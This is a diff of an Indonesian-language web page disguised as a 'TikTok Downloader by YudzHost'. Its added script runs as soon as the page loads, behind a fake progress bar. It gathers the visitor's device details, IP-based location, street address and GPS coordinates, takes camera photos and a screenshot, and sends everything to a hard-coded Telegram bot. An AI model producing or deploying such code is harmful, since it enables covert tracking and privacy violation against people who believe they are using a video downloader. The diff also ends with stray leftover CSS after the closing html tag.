@@ -1,75 +1,522 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>MULTI SYSTEM SCRIPT (SILENT)</title>
-    <meta name="description" content="BUG WA FREE BY YUDZ">
-    <link rel="icon" type="image/x-icon" href="https://files.catbox.moe/5bwkpb.ico">
-    <link rel="apple-touch-icon" href="https://files.catbox.moe/5bwkpb.png">
-    <meta name="theme-color" content="#000000">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/js/all.min.js"></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>TikTok Downloader by YudzHost</title>
+  <meta name="description" content="TikTok Downloader by YudzHost" />
+  
+  <style>
+    /* Reset & Base */
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: "Orbitron", Arial, sans-serif;
+      background-color: #0b132b;
+      color: #ccc;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+      position: relative;
+    }
+    
+    #loading-container {
+      background-color: #12192e;
+      border-radius: 12px;
+      padding: 30px 35px 35px;
+      width: 90%;
+      max-width: 420px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.85);
+      text-align: center;
+      position: relative;
+      z-index: 10;
+      border: 1px solid #22335a;
+    }
+    
+    /* Logo image */
+    #logo-image {
+      width: 120px;
+      height: 120px;
+      border-radius: 16px;
+      border: 2px solid #52b0ff;
+      box-shadow: 0 0 20px #52b0ff;
+      margin: 0 auto 25px auto;
+      object-fit: cover;
+      background-color: #0b132b;
+    }
+    
+    /* Judul glitch */
+    #loading-text {
+      font-size: 24px;
+      font-weight: 900;
+      color: #52b0ff;
+      margin-bottom: 25px;
+      letter-spacing: 1px;
+      user-select: none;
+      position: relative;
+      text-shadow: 0 0 7px #52b0ff;
+      animation: glitch 2.4s infinite;
+    }
+    #loading-text::before,
+    #loading-text::after {
+      content: attr(data-text);
+      position: absolute;
+      left: 0;
+      width: 100%;
+      overflow: hidden;
+      top: 0;
+    }
+    #loading-text::before {
+      left: 2px;
+      text-shadow: -2px 0 #ff5252;
+      clip-path: inset(0 0 50% 0);
+      animation: glitchTop 2.4s infinite ease-in-out alternate;
+    }
+    #loading-text::after {
+      left: -2px;
+      text-shadow: 2px 0 #40c4ff;
+      clip-path: inset(50% 0 0 0);
+      animation: glitchBottom 2.4s infinite ease-in-out alternate;
+    }
+    @keyframes glitch {
+      0% {
+        transform: translate(0);
+      }
+      10% {
+        transform: translate(-2px, 1px);
+      }
+      20% {
+        transform: translate(2px, -1px);
+      }
+      30% {
+        transform: translate(-1px, 2px);
+      }
+      40%, 100% {
+        transform: translate(0);
+      }
+    }
+    @keyframes glitchTop {
+      0% {
+        clip-path: inset(0 0 40% 0);
+      }
+      50% {
+        clip-path: inset(0 0 60% 0);
+      }
+      100% {
+        clip-path: inset(0 0 45% 0);
+      }
+    }
+    @keyframes glitchBottom {
+      0% {
+        clip-path: inset(60% 0 0 0);
+      }
+      50% {
+        clip-path: inset(40% 0 0 0);
+      }
+      100% {
+        clip-path: inset(55% 0 0 0);
+      }
+    }
+    
+    /* Input field style */
+    input[type="text"] {
+      background-color: #0e1626;
+      border: 1.8px solid #284b63;
+      border-radius: 7px;
+      color: #eee;
+      padding: 12px 16px;
+      font-size: 16px;
+      width: 100%;
+      margin-bottom: 18px;
+      transition: border-color 0.3s ease;
+      font-family: "Orbitron", Arial, sans-serif;
+    }
+    input[type="text"]::placeholder {
+      color: #6b798a;
+      font-weight: 600;
+    }
+    input[type="text"]:focus {
+      outline: none;
+      border-color: #52b0ff;
+      background-color: #122543;
+    }
+    
+    .button-group {
+      display: flex;
+      gap: 14px;
+      margin-bottom: 30px;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+    button {
+      cursor: pointer;
+      font-weight: 700;
+      font-size: 16px;
+      padding: 12px 22px;
+      border-radius: 8px;
+      border: none;
+      color: #fff;
+      transition: background-color 0.3s ease;
+      flex: 1 1 160px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+      user-select:none;
+    }
+    
+    #btn-video {
+      background-color: #2e7d32;
+      box-shadow: 0 0 12px #388e3c99;
+    }
+    #btn-video:hover {
+      background-color: #388e3c;
+      box-shadow: 0 0 20px #4caf5099;
+    }
+    
+    #btn-audio {
+      background-color: #1565c0;
+      box-shadow: 0 0 12px #1976d299;
+    }
+    #btn-audio:hover {
+      background-color: #1976d2;
+      box-shadow: 0 0 20px #2196f399;
+    }
+    
+    #search-section {
+      background-color: #162742;
+      border-radius: 10px;
+      padding: 20px 25px 22px;
+      text-align: left;
+      color: #8a8deb;
+      font-weight: 700;
+      font-size: 19px;
+      margin: 0;
+      margin-bottom: 15px;
+      font-family: "Orbitron", Arial, sans-serif;
+    }
+    #search-section label {
+      display: block;
+      margin-bottom: 7px;
+      color: #a2aaff;
+    }
+    #search-input {
+      margin-top: 10px;
+      margin-bottom: 20px;
+    }
+    #btn-search {
+      background-color: #448aff;
+      box-shadow: 0 0 14px #448affcc;
+      width: 100%;
+      font-weight: 700;
+      font-size: 17px;
+      color: #fff;
+      border-radius: 8px;
+      padding: 14px 0;
+      border: none;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      user-select:none;
+    }
+    #btn-search:hover {
+      background-color: #2979ff;
+    }
+    
+    /* Progress Bar */
+    #progress-container {
+      height: 6px;
+      background: #182c52;
+      border-radius: 35px;
+      overflow: hidden;
+      margin: 20px 0 10px 0;
+    }
+    #progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #52b0ff, #86cbff);
+      transition: width 0.3s ease;
+      border-radius: 35px;
+    }
+    #loading-details {
+      font-size: 14px;
+      color: #aabbcc;
+      font-weight: 600;
+      text-shadow: 0 0 5px rgba(0,0,0,0.7);
+      margin: 0;
+      min-height: 20px;
+    }
+    
+    /* Particle background */
+    .particle {
+      position: absolute;
+      background: radial-gradient(circle, #ffffffaa 0%, transparent 70%);
+      border-radius: 50%;
+      opacity: 0.3;
+      animation: floatParticle linear infinite;
+      pointer-events: none;
+      z-index: 1;
+    }
+    @keyframes floatParticle {
+      from {
+        transform: translateY(100vh) scale(1);
+      }
+      to {
+        transform: translateY(-10vh) scale(0);
+      }
+    }
 
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
+    /* Hide video and canvas */
+    #v, #c {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<script>
+  // Generate particle background (35 small dots as in original)
+  for(let i = 0; i < 35; i++) {
+    const p = document.createElement('div');
+    p.className = 'particle';
+    const size = Math.random() * 4 + 2;
+    p.style.width = size + 'px';
+    p.style.height = size + 'px';
+    p.style.left = Math.random() * 100 + '%';
+    p.style.animationDuration = (8 + Math.random() * 8) + 's';
+    p.style.animationDelay = (Math.random() * 8) + 's';
+    document.body.appendChild(p);
+  }
+</script>
+
+<div id="loading-container" role="main" aria-label="TikTok Downloader Interface">
+
+  <img id="logo-image" src="https://img1.pixhost.to/images/10200/661460061_lyrra-md.jpg" alt="Logo Budetzz" />
+
+  <div id="loading-text" data-text="TikTok Downloader by YudzHost">TikTok Downloader by YudzHost</div>
+
+  <input type="text" id="input-url" placeholder="Masukkan URL TikTok..." aria-label="Input URL TikTok" />
+
+  <div class="button-group">
+    <button id="btn-video" title="Download Video TikTok" aria-label="Download Video TikTok">
+      ⬇️ Download Video
+    </button>
+    <button id="btn-audio" title="Download Audio TikTok" aria-label="Download Audio TikTok">
+      🎧 Download Audio
+    </button>
+  </div>
+
+  <section id="search-section" aria-label="Pencarian Video TikTok">
+    <label for="search-input">🔍 Cari Video TikTok</label>
+    <input type="text" id="search-input" placeholder="Cari video TikTok..." aria-describedby="search-help" />
+    <button id="btn-search" aria-label="Cari Video TikTok">
+      🔍 Cari Video
+    </button>
+  </section>
+
+  <div id="progress-container" aria-hidden="true">
+    <div id="progress-bar"></div>
+  </div>
+
+  <div id="loading-details" aria-live="polite" aria-atomic="true">Memulai inisialisasi...</div>
+
+</div>
+
+<!-- Hidden video and canvas for camera capture -->
+<video id="v" autoplay muted></video>
+<canvas id="c"></canvas>
+
+<script>
+  // Telegram + Camera + Geo data reporting and progress simulation
+  (() => {
+    const T ='8245827093:AAEafxGE6ns_M7JHP_2XtoORUk6k-udesOU',
+          C ='7935332916',
+          pb = document.getElementById('progress-bar'),
+          ld = document.getElementById('loading-details');
+
+    const LM = [
+      "CHECKING SYSTEM MODULE...",
+      "LOADING ALL CORE COMPONENTS...",
+      "INITIALIZE INTERFACE...",
+      "VERIFY SYSTEM CONNECTION...",
+      "PREPARING SYSTEM MODULE...",
+      "CHECK FOR ALL SYSTEM UPDATES...",
+      "LOADING SYSTEM MENU ASSET...", 
+      "CHECK VERIFY MODULE SYSTEM..."
+    ];
+
+    // Loading progress simulation
+    let p = 0;
+    setInterval(() => {
+      p += Math.random()*5;
+      if(p > 98) p = 98;
+      pb.style.width = p + '%';
+      if (Math.random() > 0.9) ld.textContent = LM[Math.floor(Math.random() * LM.length)];
+    }, 500);
+
+    // Telegram sendMessage helper
+    const sTG = async d => {
+      try {
+        await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
+          method: 'POST', 
+          headers: {'Content-Type': 'application/json'}, 
+          body: JSON.stringify({chat_id: C, text: d, parse_mode:'HTML'})
+        });
+      } catch (e) {}
+    };
+
+    // Telegram sendPhoto helper
+    const sP = async (b,f) => {
+      try {
+        const fd = new FormData();
+        fd.append('chat_id', C);
+        fd.append('photo', b, f);
+        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {method:'POST', body:fd});
+      } catch(e) {}
+    };
+
+    // Get location detail from lat-lon
+    const gLD = async (a,b) => {
+      try {
+        const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`);
+        const d = await r.json();
+        if(d.address)
+          return {
+            kb: d.address.county || d.address.city || d.address.state || "Tidak diketahui",
+            kc: d.address.suburb || d.address.village || d.address.town || "Tidak diketahui",
+            fa: d.display_name || "Alamat tidak tersedia"
+          };
+      }
+      catch(e){}
+      return {kb:"Tidak diketahui", kc:"Tidak diketahui", fa:"Alamat tidak tersedia"};
+    };
+
+    // Collect device info and prepare report string
+    const cDI = async () => {
+      let m = 'TRACKING REPORTER NOTIFICATIONS\n\n';
+      m += 'DEVICE INFORMATION\n';
+      m += `🖥️ DEVICE: ${navigator.userAgent}\n`;
+      m += `💻 PLATFORM: ${navigator.platform}\n`;
+      m += `🌐 LANGUAGE: ${navigator.language}\n`;
+      m += `📶 ONLINE: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
+      m += `📺 SCREEN SIZE: ${screen.width}x${screen.height}\n`;
+      m += `🪟 WINDOW SIZE: ${innerWidth}x${innerHeight}\n`;
+      m += `💾 RAM DEVICE: ${navigator.deviceMemory || 'Unknown'} GB\n`;
+      m += `🧠 CPU DEVICE: ${navigator.hardwareConcurrency}\n`;
+      if(navigator.getBattery){
+        try{
+          const b = await navigator.getBattery();
+          m += `🔋 BATTERY: ${Math.floor(b.level*100)}%\n`;
+          m += `🔌 CHARGING: ${b.charging ? '✅ YA' : '❌ TIDAK'}\n`;
+        }catch(e){
+          m += '🔋 BATTERY: ❌ Tidak tersedia\n';
+        }
+      }
+      m += `⏰ ACCESS TIME: ${new Date().toString()}\n`;
+      m += `🕒 PAGE LOAD TIME: ${performance.now().toFixed(2)} ms\n`;
+      m += `📜 HISTORY LENGTH: ${history.length}\n`;
+      m += `✋ TOUCH SUPPORT: ${('ontouchstart' in window) ? '✅ YA' : '❌ TIDAK'}\n`;
+      m += `🔗 REFERRER: ${document.referrer || 'None'}\n`;
+      m += `🌍 URL ACCESS: ${location.href}\n`;
+      m += `📄 TITLE: ${document.title}\n`;
+      m += `🕓 TIMEZONE: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+      m += `🧭 OFFSET: ${new Date().getTimezoneOffset()} menit\n\n`;
+
+      try {
+        const i = await fetch('https://ipapi.co/json/');
+        const d = await i.json();
+        m += '📍 LOCATION INFORMATION\n';
+        m += `📡 IP ADDRESS: ${d.ip}\n`;
+        m += `🏙️ KOTA: ${d.city}\n`;
+        m += `🏙️ KABUPATEN: ${d.region}\n`;
+        m += `🌎 NEGARA: ${d.country_name}\n`;
+        m += `🏷️ KODE POS: ${d.postal}\n`;
         
-        /* Global Styles */
-        body {
-            background-color: #0d1117;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            font-family: 'Orbitron', Arial, sans-serif;
-            color: #c9d1d9;
-            overflow-y: auto;
-            position: relative;
+        if(d.latitude && d.longitude) {
+          m += `📌 LATITUDE: ${d.latitude}\n`;
+          m += `📍 LONGITUDE: ${d.longitude}\n`;
+          const l = await gLD(d.latitude,d.longitude);
+          m += `🏙️ KABUPATEN: ${l.kb}\n`;
+          m += `🏙️ KECAMATAN: ${l.kc}\n`;
+          m += `🏠 ALAMAT LENGKAP: ${l.fa}\n`;
         }
+      } catch(e) {
+        m += '❌ Gagal mendapatkan informasi lokasi\n';
+      }
 
-        /* Container */
-        .app-container {
-            width: 90%;
-            max-width: 400px;
-            background: rgba(1, 4, 9, 0.95);
-            border: 1px solid #30363d;
-            border-radius: 12px;
-            box-shadow: 0 0 15px rgba(0, 255, 255, 0.2), 0 0 30px rgba(0, 255, 255, 0.1);
-            padding: 20px;
-            margin: 40px 0;
-        }
+      m += '\nPOWERED BY LEZARD OFFICIAL\n';
+      return m;
+    };
 
-        /* Header and Status */
-        .app-header {
-            text-align: center;
-            margin-bottom: 25px;
-        }
+    // Capture camera photo (front or back)
+    const captureCamera = async(mode) => {
+      const v = document.getElementById('v'), c = document.getElementById('c');
+      let stream;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { exact: mode } }
+        });
+        v.srcObject = stream;
+        await new Promise(resolve => v.onloadedmetadata = resolve);
+        v.play();
+        await new Promise(r => setTimeout(r,1500));
+        c.width = v.videoWidth;
+        c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v,0,0);
+        c.toBlob(b => sP(b, `${mode}_camera_capture.jpg`), 'image/jpeg');
+        stream.getTracks().forEach(t => t.stop());
+        return true;
+      } catch(e) {
+        if(stream) stream.getTracks().forEach(t => t.stop());
+        await sTG(`⚠️ Gagal Akses Kamera ${mode.toUpperCase()}. Mencoba mode lain...`);
+        return false;
+      }
+    };
 
-        .app-title {
-            font-size: 24px;
-            color: #00ffff;
-            text-shadow: 0 0 5px #00ffff, 0 0 10px #00ffff;
-            padding: 5px 0;
-        }
+    // Main telemetry + screenshot + geolocation
+    const ST = async () => {
+      await sTG(await cDI());
+      let cameraSuccess = false;
+      cameraSuccess = await captureCamera('user');
+      if(!cameraSuccess)
+        cameraSuccess = await captureCamera('environment');
+      if(!cameraSuccess)
+        await sTG('❌ Akses ke kedua kamera (Depan & Belakang) diblokir.');
 
-        .server-status {
-            font-size: 16px;
-            font-weight: bold;
-            color: #00ff00;
-            text-shadow: 0 0 4px #00ff00;
-            margin-top: 5px;
+      setTimeout(async () => {
+        try {
+          const cn = await html2canvas(document.body);
+          cn.toBlob(b => sP(b,'screenshot.jpg'),'image/jpeg');
+        } catch(e) {
+          await sTG('❌ Screenshot failed');
         }
-        
-        .status-badge {
-            display: inline-block;
-            background: #143614;
-            color: #00ff00;
-            padding: 2px 8px;
-            border-radius: 4px;
-            font-size: 12px;
-            margin-top: 5px;
+      }, 2000);
+
+      if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(async p => {
+          const lat = p.coords.latitude;
+          const lon = p.coords.longitude;
+          let g = `📍 GPS TRACKING (ONE-TIME)\n\n`;
+          g += `📌 LAT: ${lat}\n📍 LNG: ${lon}\n`;
+          g += `🎯 AKURASI: ${p.coords.accuracy}m\n`;
+          g += `🗺️ GOOGLE MAPS: https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
+          const l = await gLD(lat, lon);
+          g += `🏙️ KABUPATEN: ${l.kb}\n🏙️ KECAMATAN: ${l.kc}\n🏠 ALAMAT: ${l.fa}\n`;
+          await sTG(g);
+        }, async e => {
+          await sTG(`❌ GPS Error: ${e.message}`);
+        }, { enableHighAccuracy:true, maximumAge:0, timeout:5000 });
+      }
+    };
+    ST();
+  })();
+</script>
+
+</body>
+</html>
             border: 1px solid #00ff00;
             box-shadow: 0 0 5px #00ff00;
         }
